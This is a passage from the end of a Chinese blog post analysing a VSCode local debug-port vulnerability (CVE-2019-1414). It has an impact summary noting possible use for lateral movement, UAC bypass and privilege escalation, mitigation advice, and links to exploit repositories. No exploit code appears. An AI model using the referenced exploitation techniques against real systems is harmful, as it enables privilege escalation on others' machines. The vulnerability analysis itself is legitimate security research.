+<h1 id="危害与安全建议"><a href="#危害与安全建议" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>危害与安全建议</h1>
+
+<h2 id="危害"><a href="#危害" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>危害</h2>
+
+<p>​   调试端口是暴露在本地的，所以不会有被远程攻击的危险，这一点降低了这个漏洞的危害程度。在渗透测试中，此漏洞可用来进行横向移动，可能会被用来进行bypass uac、提权等攻击行为。</p>
+
+<h2 id="安全建议"><a href="#安全建议" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>安全建议</h2>
+
+<ol>
+<li>升级到最新版本</li>
+<li>尽量避免在管理员权限下使用vscode
+
+<br /></li>
+</ol>
+
+<h1 id="链接"><a href="#链接" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>链接：</h1>
+
+<p><a href="https://iwantmore.pizza/posts/cve-2019-1414.html" target="_blank">https://iwantmore.pizza/posts/cve-2019-1414.html</a></p>
+
+<p><a href="https://github.com/phra/inspector-exploiter" target="_blank">https://github.com/phra/inspector-exploiter</a></p>
+
+<p><a href="https://github.com/aslushnikov/getting-started-with-cdp/blob/master/README.md" target="_blank">https://github.com/aslushnikov/getting-started-with-cdp/blob/master/README.md</a></p>
+
+<p><a href="https://chromedevtools.github.io/devtools-protocol/tot/Runtime" target="_blank">https://chromedevtools.github.io/devtools-protocol/tot/Runtime</a></p>
+
+<p><a href="https://github.com/b1tg/inspector-exploiter/blob/master/debug-expressions.js" target="_blank">https://github.com/b1tg/inspector-exploiter/blob/master/debug-expressions.js</a></p>
+
+<p>文章首发于<a href="https://www.anquanke.com/post/id/190323" target="_blank">安全客</a></p>
+</div>
+
+        </article>
+
+        
+            
+            
+            
+                <ul class="post-copyright">
+                    <li class="copyright-item author">作者：<a href="https://b1tg.github.io" target="_blank">b1tg</a></li>
+                    
+                        <li class="copyright-item link">链接：<a href="/posts/vscode-local-execute/" target="_blank">https://b1tg.github.io/posts/vscode-local-execute/</a></li>
+                    
+                    
+                        <li class="copyright-item license">版权：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0</a></li>
+                    
+                </ul>
+            
+        
+
+        
+            <div class="updated-badge-container"><div title="Updated @ 2019-11-16 20:28:19 CST" style="cursor:help;display:inline-block">
+
+<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2019-11-16</text><text x="915" y="140" textLength="650" transform="scale(.1)">2019-11-16</text></g></svg></div></div>
+        
+
+        
+
+        
+            
+            
+        
+
+        
+            
+                <div class="post-tags">
+                    
+                        
+                        
+                            
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag" class="post-tags-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon tag-icon"><path d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"/></svg>漏洞分析</a>
+                        
+                    
+                </div>
+            
+        
+
+        
+
+        
+
+        
+            
+                
+                
+            
+            
+            
+            
+        
+
+        
+        
+    </div>
+</main>
+
+            
+    <a href="#" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+                
+            
+            
+
+            
+                
+            
+            
+
+            
+                
+            
+            
+
+            <div class="site-info">© 2018–2019<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>b1tg</div>
+
+            
+                <div class="powered-by">Powered by <a href="https://github.com/gohugoio/hugo" target="_blank">Hugo</a> | Theme is <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank">MemE</a></div>
+            
+
+            
+
+            
+        </div>
+    </footer>
+
+        </div>
+        <script src="/js/meme.min.be273f7eb89932146bc893fce7038195a4860d8c6b61bab732423bf2dcf29375.js" integrity="sha256-vic/friZMhRryJP85wOBlaSGDYxrYbq3MkI78tzyk3U=" data-no-instant></script><script data-no-instant>InstantClick.init();</script>
+
+    
+        <script data-no-instant>
+            InstantClick.on('change', function () {
+                const theme = localStorage.getItem('theme');
+                if (theme === "dark") {
+                    document.documentElement.setAttribute('data-theme', 'dark');
+                    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#1c1c21');
+                    document.getElementById("theme-toggle").innerHTML = "🌙";
+
+                    var els = [].slice.apply(document.getElementsByClassName("chroma"));
+                    for (var i = 0; i < els.length; i++) {
+                        els[i].className = els[i].className.replace(/ *\bchroma\b/g, "chroma-dark");
+                    }
+                } else if (theme === "light") {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff');
+                    document.getElementById("theme-toggle").innerHTML = "🌞";
+
+                    var els = [].slice.apply(document.getElementsByClassName("chroma-dark"));
+                    for (var i = 0; i < els.length; i++) {
+                        els[i].className = els[i].className.replace(/ *\bchroma-dark\b/g, "chroma");
+                    }
+                }
+            });
+        </script>
+    
+
+
+
+
+
+
+    </body>
+</html>
